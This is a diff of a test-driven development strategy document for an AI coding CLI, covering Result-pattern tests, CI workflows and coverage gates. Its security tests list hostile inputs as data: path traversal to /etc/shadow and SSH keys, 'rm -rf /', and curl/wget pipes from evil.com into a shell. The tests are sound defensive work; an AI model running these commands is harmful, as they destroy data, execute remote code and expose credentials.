@@ -4,7 +4,7 @@
 **Date:** 2025-01-27  
 **Status:** Implementation Strategy  
 **Alignment:** CLAUDE-BUILD-PLAN.md v2.0 MVP  
-**Testing Philosophy:** Security-First Test-Driven Development  
+**Testing Philosophy:** Security-First Test-Driven Development
 
 ---
 
@@ -15,7 +15,7 @@ This document defines a **comprehensive Test-Driven Development (TDD) strategy**
 ### TDD Objectives
 
 1. **Security-First Testing**: Every feature tested for security vulnerabilities from inception
-2. **High Coverage**: >90% test coverage across unit, integration, and e2e tests  
+2. **High Coverage**: >90% test coverage across unit, integration, and e2e tests
 3. **Fast Feedback**: Test suite runs in <10 minutes for rapid development
 4. **Cross-Platform Quality**: Consistent behavior across Windows, macOS, Linux
 5. **AI-Specific Testing**: Specialized testing for AI interactions and responses
@@ -37,13 +37,13 @@ graph TB
         UNIT_SEC[Unit Security Tests<br/>30% - Input Validation, Crypto]
         STATIC[Static Security Analysis<br/>50% - SAST, Secret Detection]
     end
-    
+
     subgraph "Functional Testing Layers"
         E2E_FUNC[E2E Functional Tests<br/>10% - User Scenarios]
         INT_FUNC[Integration Tests<br/>20% - Component Integration]
         UNIT_FUNC[Unit Tests<br/>70% - Individual Functions]
     end
-    
+
     STATIC --> UNIT_SEC
     UNIT_SEC --> INT_SEC
     INT_SEC --> E2E_SEC
@@ -61,6 +61,41 @@ graph TB
 6. **📚 Standards-Based**: Follow OWASP testing guidelines and industry security testing standards
 7. **🔍 Research Community Patterns**: Study established security testing patterns before implementation
 8. **⚡ Simple Test Design**: Use proven testing patterns over complex custom approaches
+9. **🔧 Consistent Error Handling**: Use Result<T,E> for expected failures, try-catch for unexpected exceptions
+
+### Testing Pattern Guidelines
+
+#### When to Use Result<T,E> Pattern
+
+- **Expected failures** (validation errors, business logic failures)
+- **Recoverable errors** (authentication failures, network timeouts)
+- **User input validation** (malformed data, security violations)
+- **API responses** (rate limits, quota exceeded)
+
+```typescript
+// ✅ Good: Expected validation failure
+const result = InputValidator.validateEmail('invalid-email');
+expect(result.success).toBe(false);
+expect(result.error?.type).toBe('INVALID_EMAIL_FORMAT');
+```
+
+#### When to Use Try-Catch Pattern
+
+- **Unexpected system failures** (out of memory, disk full)
+- **Programming errors** (null reference, undefined function)
+- **External system failures** (database down, file system errors)
+- **Third-party library exceptions** (parsing errors, network failures)
+
+```typescript
+// ✅ Good: Unexpected system exception
+try {
+  await DatabaseConnection.connect(invalidConfig);
+  fail('Should have thrown system exception');
+} catch (error) {
+  expect(error).toBeInstanceOf(ConnectionError);
+  expect(error.message).toContain('Database unreachable');
+}
+```
 
 ---
 
@@ -71,7 +106,14 @@ graph TB
 **Coverage Target**: 100% of security-critical functions
 
 ```typescript
-// Example: Input validation security tests
+// Result<T,E> type definition for consistent error handling
+interface ValidationResult<T> {
+  success: boolean;
+  data?: T;
+  error?: ValidationError;
+}
+
+// Example: Input validation security tests using Result<T,E> pattern
 describe('InputValidator Security Tests', () => {
   describe('Path Traversal Prevention', () => {
     test('should block directory traversal attempts', () => {
@@ -80,71 +122,80 @@ describe('InputValidator Security Tests', () => {
         '..\\..\\..\\windows\\system32',
         '/etc/shadow',
         '.ssh/id_rsa',
-        '~/.bashrc'
+        '~/.bashrc',
       ];
-      
+
       maliciousInputs.forEach(input => {
-        expect(() => InputValidator.validateFilePath(input))
-          .toThrow(SecurityValidationError);
-        expect(InputValidator.validateFilePath(input).isValid)
-          .toBe(false);
+        const result = InputValidator.validateFilePath(input);
+        expect(result.success).toBe(false);
+        expect(result.error?.type).toBe('PATH_TRAVERSAL');
+        expect(result.data).toBeUndefined();
       });
     });
-    
+
     test('should allow legitimate file paths', () => {
-      const legitimateInputs = [
-        './src/components/Button.tsx',
-        'project/src/utils.js',
-        'docs/README.md'
-      ];
-      
+      const legitimateInputs = ['./src/components/Button.tsx', 'project/src/utils.js', 'docs/README.md'];
+
       legitimateInputs.forEach(input => {
-        expect(() => InputValidator.validateFilePath(input))
-          .not.toThrow();
-        expect(InputValidator.validateFilePath(input).isValid)
-          .toBe(true);
+        const result = InputValidator.validateFilePath(input);
+        expect(result.success).toBe(true);
+        expect(result.error).toBeUndefined();
+        expect(result.data).toBeDefined();
       });
     });
   });
 
   describe('Command Injection Prevention', () => {
-    test('should sanitize shell command inputs', () => {
+    test('should detect command injection attempts', () => {
       const maliciousCommands = [
         'ls; rm -rf /',
         'dir && del /f /s /q C:\\*',
         '`curl http://evil.com/steal.sh | bash`',
         '$(wget -O - http://evil.com/malware.sh | sh)',
-        'file.txt; cat ~/.ssh/id_rsa'
+        'file.txt; cat ~/.ssh/id_rsa',
       ];
-      
+
       maliciousCommands.forEach(cmd => {
-        expect(() => CommandExecutor.sanitizeCommand(cmd))
-          .toThrow(CommandInjectionError);
+        const result = CommandExecutor.sanitizeCommand(cmd);
+        expect(result.success).toBe(false);
+        expect(result.error?.type).toBe('COMMAND_INJECTION');
+        expect(result.data).toBeUndefined();
       });
+    });
+
+    test('should handle system exceptions with try-catch', async () => {
+      try {
+        await CommandExecutor.executeCommand('nonexistent-command');
+        fail('Should have thrown an exception');
+      } catch (error) {
+        expect(error).toBeInstanceOf(SystemExecutionError);
+        expect(error.message).toContain('Command not found');
+      }
     });
   });
 
   describe('Authentication Security', () => {
     test('should securely store credentials', async () => {
       const credentials = { apiKey: 'test-api-key-123' };
-      
+
       await AuthManager.storeCredentials(credentials);
-      
+
       // Verify credentials are encrypted
       const storedData = await SecureStorage.read('credentials');
       expect(storedData).not.toContain('test-api-key-123');
       expect(CryptoUtils.isEncrypted(storedData)).toBe(true);
     });
-    
+
     test('should handle token expiration securely', async () => {
       const expiredToken = createExpiredToken();
-      
+
       const result = await AuthManager.validateToken(expiredToken);
-      
-      expect(result.valid).toBe(false);
-      expect(result.error).toBe('TOKEN_EXPIRED');
+
+      expect(result.success).toBe(false);
+      expect(result.error?.type).toBe('TOKEN_EXPIRED');
+      expect(result.data).toBeUndefined();
       // Ensure no token data leaks in error
-      expect(result.error).not.toContain(expiredToken.value);
+      expect(result.error?.message).not.toContain(expiredToken.value);
     });
   });
 });
@@ -160,38 +211,40 @@ describe('Security Integration Tests', () => {
     test('should complete Google OAuth2 flow securely', async () => {
       const authFlow = new GoogleOAuth2Flow({
         clientId: 'test-client-id',
-        redirectUri: 'http://localhost:3000/auth/callback'
+        redirectUri: 'http://localhost:3000/auth/callback',
       });
-      
+
       // Start OAuth flow
       const authUrl = await authFlow.getAuthUrl();
       expect(authUrl).toContain('https://accounts.google.com/oauth/authorize');
-      expect(authUrl).toContain('state=');  // CSRF protection
-      
+      expect(authUrl).toContain('state='); // CSRF protection
+
       // Simulate callback with authorization code
       const mockCallback = {
         code: 'mock-auth-code',
-        state: extractStateFromUrl(authUrl)
+        state: extractStateFromUrl(authUrl),
       };
-      
+
       const tokens = await authFlow.handleCallback(mockCallback);
-      
+
       // Verify secure token storage
       expect(tokens.accessToken).toBeTruthy();
       expect(tokens.refreshToken).toBeTruthy();
       expect(await SecureStorage.exists('auth_tokens')).toBe(true);
     });
-    
+
     test('should reject invalid authentication attempts', async () => {
       const invalidAttempts = [
         { method: 'api-key', credentials: { apiKey: null } },
         { method: 'api-key', credentials: { apiKey: '' } },
-        { method: 'oauth2', credentials: { refreshToken: 'invalid' } }
+        { method: 'oauth2', credentials: { refreshToken: 'invalid' } },
       ];
-      
+
       for (const attempt of invalidAttempts) {
-        await expect(AuthManager.authenticate(attempt))
-          .rejects.toThrow(AuthenticationError);
+        const result = await AuthManager.authenticate(attempt);
+        expect(result.success).toBe(false);
+        expect(result.error?.type).toBe('AUTHENTICATION_FAILED');
+        expect(result.data).toBeUndefined();
       }
     });
   });
@@ -200,21 +253,30 @@ describe('Security Integration Tests', () => {
     test('should handle rate limiting securely', async () => {
       const rateLimiter = new RateLimiter({
         rpm: 5,
-        burstLimit: 2
+        burstLimit: 2,
       });
-      
+
       // Rapid-fire requests should be rate limited
-      const requests = Array(10).fill().map(() => 
-        GeminiClient.generateContent({ prompt: 'test' })
-      );
-      
+      const requests = Array(10)
+        .fill()
+        .map(() => GeminiClient.generateContent({ prompt: 'test' }));
+
       const results = await Promise.allSettled(requests);
       const failures = results.filter(r => r.status === 'rejected');
-      
+
       expect(failures.length).toBeGreaterThan(5);
       failures.forEach(failure => {
-        expect(failure.reason).toBeInstanceOf(RateLimitError);
+        expect(failure.reason.type).toBe('RATE_LIMIT_EXCEEDED');
       });
+
+      // Test unexpected system failure with try-catch
+      try {
+        await GeminiClient.generateContent({ prompt: null }); // Invalid input causing system error
+        fail('Should have thrown system exception');
+      } catch (error) {
+        expect(error).toBeInstanceOf(SystemError);
+        expect(error.message).toContain('Invalid request format');
+      }
     });
   });
 });
@@ -230,25 +292,25 @@ describe('Command Unit Tests', () => {
     test('should explain JavaScript code correctly', async () => {
       const code = 'function add(a, b) { return a + b; }';
       const command = new ExplainCommand();
-      
+
       const result = await command.execute({
         args: { code },
-        options: { language: 'javascript', detail: 'standard' }
+        options: { language: 'javascript', detail: 'standard' },
       });
-      
+
       expect(result.success).toBe(true);
       expect(result.data.explanation).toContain('function');
       expect(result.data.explanation).toContain('addition');
     });
-    
+
     test('should handle unsupported language gracefully', async () => {
       const command = new ExplainCommand();
-      
+
       const result = await command.execute({
         args: { code: 'invalid syntax here' },
-        options: { language: 'unknown-lang' }
+        options: { language: 'unknown-lang' },
       });
-      
+
       expect(result.success).toBe(false);
       expect(result.error).toBeInstanceOf(UnsupportedLanguageError);
     });
@@ -257,14 +319,14 @@ describe('Command Unit Tests', () => {
   describe('ScaffoldCommand', () => {
     test('should generate React component', async () => {
       const command = new ScaffoldCommand();
-      
+
       const result = await command.execute({
-        args: { 
+        args: {
           type: 'react-component',
-          description: 'Button with click handler'
-        }
+          description: 'Button with click handler',
+        },
       });
-      
+
       expect(result.success).toBe(true);
       expect(result.data.files).toHaveLength(1);
       expect(result.data.files[0].content).toContain('React');
@@ -286,15 +348,12 @@ describe('E2E Tests', () => {
       let result = await cli.run(['explain', 'src/utils.js']);
       expect(result.exitCode).toBe(0);
       expect(result.output).toContain('explanation');
-      
+
       // 2. Generate new component
-      result = await cli.run([
-        'scaffold', 'react-component', 
-        'Modal with backdrop'
-      ]);
+      result = await cli.run(['scaffold', 'react-component', 'Modal with backdrop']);
       expect(result.exitCode).toBe(0);
       expect(fs.existsSync('Modal.tsx')).toBe(true);
-      
+
       // 3. Stage and commit
       await cli.run(['git', 'add', 'Modal.tsx']);
       result = await cli.run(['commit']);
@@ -308,9 +367,9 @@ describe('E2E Tests', () => {
       const testCases = [
         ['explain', 'package.json'],
         ['docstring', 'src/'],
-        ['context', '--analyze']
+        ['context', '--analyze'],
       ];
-      
+
       for (const testCase of testCases) {
         const result = await cli.run(testCase);
         expect(result.exitCode).toBe(0);
@@ -337,14 +396,14 @@ jobs:
     name: 🔒 Security Tests
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v4
-    - uses: actions/setup-node@v4
-      with:
-        node-version: '20'
-    - run: npm ci
-    - run: npm run test:security
-    - run: npm run test:security-integration
-    
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm ci
+      - run: npm run test:security
+      - run: npm run test:security-integration
+
   unit-tests:
     name: 🧪 Unit Tests (${{ matrix.os }})
     strategy:
@@ -352,27 +411,27 @@ jobs:
         os: [ubuntu-latest, windows-latest, macos-latest]
     runs-on: ${{ matrix.os }}
     steps:
-    - uses: actions/checkout@v4
-    - uses: actions/setup-node@v4
-      with:
-        node-version: '20'
-    - run: npm ci
-    - run: npm run test:unit -- --coverage
-    - uses: codecov/codecov-action@v3
-      with:
-        flags: ${{ matrix.os }}
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm ci
+      - run: npm run test:unit -- --coverage
+      - uses: codecov/codecov-action@v3
+        with:
+          flags: ${{ matrix.os }}
 
   integration-tests:
     name: 🔗 Integration Tests
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v4
-    - uses: actions/setup-node@v4
-      with:
-        node-version: '20'
-    - run: npm ci
-    - run: npm run test:integration
-    
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm ci
+      - run: npm run test:integration
+
   e2e-tests:
     name: 🚀 E2E Tests (${{ matrix.os }})
     strategy:
@@ -380,13 +439,13 @@ jobs:
         os: [ubuntu-latest, windows-latest, macos-latest]
     runs-on: ${{ matrix.os }}
     steps:
-    - uses: actions/checkout@v4
-    - uses: actions/setup-node@v4
-      with:
-        node-version: '20'
-    - run: npm ci
-    - run: npm run build
-    - run: npm run test:e2e
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm ci
+      - run: npm run build
+      - run: npm run test:e2e
 ```
 
 ### Test Configuration
@@ -414,11 +473,7 @@ jobs:
         "statements": 90
       }
     },
-    "collectCoverageFrom": [
-      "src/**/*.ts",
-      "!src/**/*.test.ts",
-      "!src/**/*.spec.ts"
-    ]
+    "collectCoverageFrom": ["src/**/*.ts", "!src/**/*.test.ts", "!src/**/*.spec.ts"]
   }
 }
 ```
@@ -429,12 +484,12 @@ jobs:
 
 ### Coverage Requirements
 
-| Test Type | Minimum Coverage | Target Coverage | Critical Paths |
-|-----------|------------------|-----------------|----------------|
-| **Security Tests** | 100% | 100% | Auth, Input Validation, Crypto |
-| **Unit Tests** | 90% | 95% | All business logic |
-| **Integration Tests** | 80% | 90% | API integrations |
-| **E2E Tests** | 70% | 85% | Critical user flows |
+| Test Type             | Minimum Coverage | Target Coverage | Critical Paths                 |
+| --------------------- | ---------------- | --------------- | ------------------------------ |
+| **Security Tests**    | 100%             | 100%            | Auth, Input Validation, Crypto |
+| **Unit Tests**        | 90%              | 95%             | All business logic             |
+| **Integration Tests** | 80%              | 90%             | API integrations               |
+| **E2E Tests**         | 70%              | 85%             | Critical user flows            |
 
 ### Quality Gates
 
@@ -446,31 +501,31 @@ module.exports = {
       statements: 90,
       branches: 90,
       functions: 90,
-      lines: 90
+      lines: 90,
     },
     // Security-critical files require 100% coverage
     './src/lib/security/': {
       statements: 100,
       branches: 100,
       functions: 100,
-      lines: 100
-    }
+      lines: 100,
+    },
   },
-  
+
   // Fail fast on security test failures
   testFailureExitCode: 1,
-  
+
   // Performance requirements
   testTimeout: 10000, // 10 second max per test
-  
+
   // Security test configuration
   projects: [
     {
       displayName: 'security',
       testMatch: ['<rootDir>/test/security/**/*.test.ts'],
-      setupFilesAfterEnv: ['<rootDir>/test/security/setup.ts']
-    }
-  ]
+      setupFilesAfterEnv: ['<rootDir>/test/security/setup.ts'],
+    },
+  ],
 };
 ```
 
@@ -539,14 +594,14 @@ describe('NewCommand TDD', () => {
       const command = new NewCommand();
       expect(() => command.validate(null)).toThrow();
     });
-    
+
     test('should handle authentication securely', () => {
       // Write failing test for auth requirement
       const command = new NewCommand();
       expect(() => command.execute({ auth: null })).toThrow();
     });
   });
-  
+
   // 2. Functional tests second
   describe('Functional Requirements', () => {
     test('should execute primary function', () => {
@@ -555,7 +610,7 @@ describe('NewCommand TDD', () => {
       // Test implementation goes here
     });
   });
-  
+
   // 3. Integration tests third
   describe('Integration Requirements', () => {
     test('should integrate with Gemini API', () => {
@@ -572,7 +627,7 @@ describe('NewCommand TDD', () => {
 ### MVP Completion Criteria
 
 - ✅ **Security Tests**: 100% coverage of security-critical functions
-- ✅ **Unit Tests**: >95% code coverage across all commands  
+- ✅ **Unit Tests**: >95% code coverage across all commands
 - ✅ **Integration Tests**: All API integrations tested
 - ✅ **E2E Tests**: Critical workflows tested on all platforms
 - ✅ **Performance**: Test suite runs in <10 minutes
